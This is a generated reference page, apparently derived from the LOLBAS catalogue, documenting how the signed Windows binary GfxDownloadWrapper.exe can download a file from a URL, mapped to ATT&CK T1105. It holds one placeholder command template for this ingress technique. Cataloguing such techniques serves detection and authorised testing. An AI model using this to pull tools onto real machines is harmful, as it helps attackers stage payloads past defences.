---
parsed_by: focuslocust
source: commands
type: generated
---
# GfxDownloadWrapper Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## GfxDownloadWrapper.exe

Tool page: [GfxDownloadWrapper.exe](../../tools/windows/gfxdownloadwrapper.exe.md)

### Download file from internet

```text
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```

Description:

GfxDownloadWrapper.exe downloads the content that returns URL and writes it to the file DESTINATION FILE PATH. The binary is signed by "Microsoft Windows Hardware", "Compatibility Publisher", "Microsoft Windows Third Party Component CA 2012", "Microsoft Time-Stamp PCA 2010", "Microsoft Time-Stamp Service".

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/HonorableMentions/GfxDownloadWrapper.yml` |
| Evidence | Command preserved from source parser. |
